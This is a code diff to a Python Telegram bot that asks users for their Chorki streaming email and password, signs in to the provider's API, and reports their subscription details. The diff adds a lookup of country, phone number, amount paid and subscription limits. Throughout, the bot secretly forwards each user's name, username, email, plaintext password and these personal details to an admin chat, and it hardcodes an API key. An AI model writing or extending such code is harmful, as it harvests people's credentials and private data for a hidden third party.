@@ -907,9 +907,9 @@ def process_hoinew_name_step(message):
     except Exception as e:
         print(f"An error occurred: {e}")
 
-# Command handler for /chorki_sign_in
+#Command handler for /chorki_sign_in
 @bot.message_handler(func=lambda message: message.text == 'CHORKI SIGN IN')
-def handle_chorki_signin(message):
+def handle_signin(message):
     try:
         bot.reply_to(message, "Please enter your Chorki email:")
         user_states[message.chat.id] = 'CHORKI_SIGNIN_EMAIL'
@@ -917,7 +917,7 @@ def handle_chorki_signin(message):
         bot.send_message(message.chat.id, "An error occurred. Please try again.")
 
 @bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_SIGNIN_EMAIL')
-def handle_chorki_signin_email_input(message):
+def handle_signin_email_input(message):
     try:
         # Process the email and move to the next state
         user_states[message.chat.id] = 'CHORKI_SIGNIN_PASSWORD'
@@ -929,7 +929,7 @@ def handle_chorki_signin_email_input(message):
         bot.send_message(message.chat.id, "An error occurred. Please try again.")
 
 @bot.message_handler(func=lambda message: user_states.get(message.chat.id) == 'CHORKI_SIGNIN_PASSWORD')
-def handle_chorki_signin_password_input(message):
+def handle_signin_password_input(message):
     try:
         # Process the password and complete the SIGN IN
 
@@ -939,8 +939,15 @@ def handle_chorki_signin_password_input(message):
             "password": message.text
         }
 
+        # Start the timer
+        start_time = time.time()
+
         # Make the API request for SIGN IN
         sign_in_response = send_api_request_with_details(f"{API_URL}/signin?site=prothomalo", headers=headersC, data=signin_data)
+
+        # Calculate the elapsed time
+        elapsed_time = time.time() - start_time
+        elapsed_time_message = f"Time taken: {elapsed_time:.2f} seconds"
 
         if sign_in_response and 'isSubscribed' in sign_in_response:
             # Check if the user has a subscription
@@ -948,38 +955,82 @@ def handle_chorki_signin_password_input(message):
 
             if is_subscribed:
                 # User has a subscription, retrieve subscription info
-                subscription_info = sign_in_response.get('subscriptionInfo', {})
-                
-                # Calculate days left for subscription
-                end_date_str = subscription_info.get('subscriptionEndDate', '')
-                days_left = calculate_days_left(end_date_str)
+                authorization_token = sign_in_response.get('authorizationToken', '')
 
-                # Calculate processing time
-                processing_time = "{:.2f}".format(timeit.default_timer() - start_time)
+                # User endpoint request
+                user_url = "https://prod-api.viewlift.com/identity/user?site=prothomalo"
+                user_headers = {
+                    "authorization": authorization_token,
+                    "User-Agent": "NiHAL",
+                    "X-Api-Key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
+                }
 
-                # Send details to the user
-                user_message = f"**Successful Sign In!**\n\n"
-                user_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
-                user_message += f"Password: {message.text}\n"
-                user_message += f"Days Left for Subscription: {days_left} days\n"
-                user_message += f"Processing Time: {processing_time} seconds\n"
-                user_message += "\nPowered by @N2X4E"
-                bot.send_message(message.chat.id, user_message, parse_mode='Markdown')
+                user_response = requests.get(user_url, headers=user_headers)
 
-                # Send details to admin
-                admin_message = f"**Sign In Details:**\n"
-                admin_message += f"Name: {message.from_user.first_name}\n"
-                admin_message += f"Username: @{message.from_user.username}\n"
-                admin_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
-                admin_message += f"Password: {message.text}\n"
-                admin_message += f"Days Left for Subscription: {days_left} days\n"
-                admin_message += f"Processing Time: {processing_time} seconds\n"
-                bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')
+                if user_response.status_code == 200:
+                    user_data = user_response.json()
+
+                    # Key checks and print information
+                    if "country" in user_data:
+                        country_info = f"**Country:** {user_data['country']}"
+                    else:
+                        country_info = "**Country:** Not Provided"
+
+                    if "phoneNumber" in user_data:
+                        phone_info = f"**Phone Number:** {user_data['phoneNumber']}"
+                    else:
+                        phone_info = "**Phone Number:** Not Provided"
+
+                    if "subscription" in user_data and "subscriptionInfo" in user_data["subscription"]:
+                        subscription_info = user_data["subscription"]["subscriptionInfo"]
+
+                        total_amount_info = f"**Total Amount:** {subscription_info.get('totalAmount', 'N/A')}"
+                        devices_info = f"**Number of Allowed Devices:** {subscription_info.get('numberOfAllowedDevices', 'N/A')}"
+                        streams_info = f"**Number of Allowed Streams:** {subscription_info.get('numberOfAllowedStreams', 'N/A')}"
+                        end_date_info = f"**Subscription End Date:** {subscription_info.get('subscriptionEndDate', 'N/A')}"
+                    else:
+                        total_amount_info = "**Total Amount:** Not Provided"
+                        devices_info = "**Number of Allowed Devices:** Not Provided"
+                        streams_info = "**Number of Allowed Streams:** Not Provided"
+                        end_date_info = "**Subscription End Date:** Not Provided"
+
+                    # Send details to the user
+                    user_message = f"**Successful Sign In!**\n\n"
+                    user_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
+                    user_message += f"Password: {message.text}\n\n"
+                    user_message += f"{country_info}\n"
+                    user_message += f"{phone_info}\n"
+                    user_message += f"{total_amount_info}\n"
+                    user_message += f"{devices_info}\n"
+                    user_message += f"{streams_info}\n"  # New line for Number of Allowed Streams
+                    user_message += f"{end_date_info}\n"
+                    user_message += f"{elapsed_time_message}\n"
+                    user_message += "\nPowered by @N2X4E"
+                    bot.send_message(message.chat.id, user_message, parse_mode='Markdown')
+
+                    # Send details to admin
+                    admin_message = f"**Sign In Details:**\n"
+                    admin_message += f"Name: {message.from_user.first_name}\n"
+                    admin_message += f"Username: @{message.from_user.username}\n"
+                    admin_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
+                    admin_message += f"Password: {message.text}\n\n"
+                    admin_message += f"{country_info}\n"
+                    admin_message += f"{phone_info}\n"
+                    admin_message += f"{total_amount_info}\n"
+                    admin_message += f"{devices_info}\n"
+                    admin_message += f"{streams_info}\n"
+                    admin_message += f"{end_date_info}"
+                    bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')
+
+                else:
+                    bot.send_message(message.chat.id, f"Error accessing user endpoint: {user_response.status_code}")
+                    bot.send_message(message.chat.id, "Please try again later.")
 
             else:
                 user_message = f"**Successful Sign In**, but you don't have a subscription.\n\n"
                 user_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
                 user_message += f"Password: {message.text}\n"
+                user_message += f"{elapsed_time_message}\n"
                 user_message += "\nPowered by @N2X4E"
                 bot.send_message(message.chat.id, user_message, parse_mode='Markdown')
 
@@ -989,6 +1040,7 @@ def handle_chorki_signin_password_input(message):
                 admin_message += f"Username: @{message.from_user.username}\n"
                 admin_message += f"Email: {user_states.get('temp_chorkiemail', '')}\n"
                 admin_message += f"Password: {message.text}\n"
+                admin_message += f"{elapsed_time_message}\n"
                 bot.send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')
 
         else:
